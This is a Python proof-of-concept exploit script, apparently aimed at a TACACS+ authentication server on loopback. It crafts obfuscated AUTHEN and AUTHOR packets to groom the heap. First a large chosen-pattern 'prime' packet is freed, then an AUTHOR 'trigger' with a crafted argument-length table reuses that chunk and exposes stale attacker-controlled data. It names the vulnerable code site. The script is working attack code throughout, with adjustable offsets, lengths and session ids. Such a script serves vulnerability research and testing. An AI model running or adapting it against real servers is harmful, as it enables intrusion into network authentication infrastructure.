#!/usr/bin/env python3
"""Large seq-3 AUTHEN/CONT prime + AUTHOR trigger on one loopback connection.

The seq-1 buffer is session-owned; the seq-3 prime buffer is allocated from
and freed back to the context allocator at packet.c:917.  The prime's AUTHEN
reply is FAIL, so the session is cleaned up; the trigger therefore starts a
new session (seq 1, different session id) on the same connection.  The small
trigger chunk should be carved from the just-freed large prime chunk, whose
chosen plaintext survives behind the trigger's calloc-zeroed prefix.

Nothing here contacts anything off loopback.
"""
import argparse
import hashlib
import socket
import struct


def pad(sid, key, version, seq, prev=b""):
    return hashlib.md5(sid + key + bytes([version, seq]) + prev).digest()


def obf(body, sid, key, version, seq):
    p = pad(sid, key, version, seq)
    out = bytearray()
    for i in range(0, len(body), 16):
        c = body[i:i + 16]
        out.extend(a ^ b for a, b in zip(c, p))
        p = pad(sid, key, version, seq, p)
    return bytes(out)


def wire_hdr(ptype, seq, sid, body, key, version=0xC0, flags=0):
    e = obf(body, sid, key, version, seq)
    hdr = struct.pack("!BBBBI", version, ptype, seq, flags, int.from_bytes(sid, "big"))
    hdr += struct.pack("!I", len(body))
    return hdr + e


def authen_start(sid, key, user, data=b"", version=0xC0):
    u = user.encode()
    fixed = bytes([1, 0, 1, 1, len(u), 0, 0, len(data)])
    return wire_hdr(1, 1, sid, fixed + u + data, key, version)


def authen_cont_prime(sid, key, seq, body_len, pattern_body_off, pattern, version=0xC0):
    """AUTHEN/CONT, msg_len=0, data_len=body_len-5, chosen pattern at body
    offset pattern_body_off."""
    data_len = body_len - 5
    fixed = struct.pack("!HHB", 0, data_len, 0)
    data = bytearray(b"P" * data_len)
    off = pattern_body_off - 5
    data[off:off + len(pattern)] = pattern
    return wire_hdr(1, seq, sid, fixed + bytes(data), key, version)


def author_trigger(sid, key, seq, table, data, version=0xC0):
    fixed = bytes([6, 1, 1, 1, 0, 0, 0, len(table)])
    return wire_hdr(2, seq, sid, fixed + bytes(table) + data, key, version)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=4990)
    ap.add_argument("--key", default="demo")
    ap.add_argument("--sid", default="11223344")
    ap.add_argument("--trigger-sid", default="aabbccdd")
    ap.add_argument("--user", default="demo")
    ap.add_argument("--prime-len", type=int, default=2000)
    ap.add_argument("--pattern-off", type=int, default=1112)
    ap.add_argument("--pattern-count", type=int, default=40)
    ap.add_argument("--data", default="cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH")
    ap.add_argument("--arg0", type=int, default=8)
    ap.add_argument("--rest", type=int, default=19)
    ap.add_argument("--rest-byte", type=int, default=8)
    ap.add_argument("--skips", default="8,9,10,11")
    ap.add_argument("--skip-size", type=int, default=255)
    ap.add_argument("--prime-seq", type=int, default=3)
    ap.add_argument("--trigger-seq", type=int, default=1)
    ap.add_argument("--no-prime", action="store_true")
    ap.add_argument("--pattern-byte", default="Z")
    ap.add_argument("--timeout", type=float, default=3.0)
    a = ap.parse_args()

    sid = bytes.fromhex(a.sid)
    key = a.key.encode()
    pattern = ("cmd=" + a.pattern_byte * 4).encode() * a.pattern_count
    table = [a.arg0] + [a.rest_byte] * a.rest
    for si in (int(x) for x in a.skips.split(",") if x.strip()):
        table[si] = a.skip_size

    s = socket.create_connection(("127.0.0.1", a.port), timeout=a.timeout)
    s.settimeout(a.timeout)

    if not a.no_prime:
        p1 = authen_start(sid, key, a.user)
        s.sendall(p1)
        try:
            r1 = s.recv(65536)
        except socket.timeout:
            r1 = b""
        print(f"seq1 sent={len(p1)} reply_len={len(r1)} reply={r1[:32].hex()}")

        p2 = authen_cont_prime(sid, key, a.prime_seq, a.prime_len, a.pattern_off, pattern)
        s.sendall(p2)
        try:
            r2 = s.recv(65536)
        except socket.timeout:
            r2 = b""
        print(f"seq{a.prime_seq} sent={len(p2)} reply_len={len(r2)} reply={r2[:32].hex()}")

    p3 = author_trigger(bytes.fromhex(a.trigger_sid), key, a.trigger_seq, table, a.data.encode())
    s.sendall(p3)
    try:
        r3 = s.recv(65536)
    except socket.timeout:
        r3 = b""
    print(f"trigger seq{a.trigger_seq} sent={len(p3)} reply_len={len(r3)} reply={r3[:64].hex()}")
    s.close()


if __name__ == "__main__":
    main()
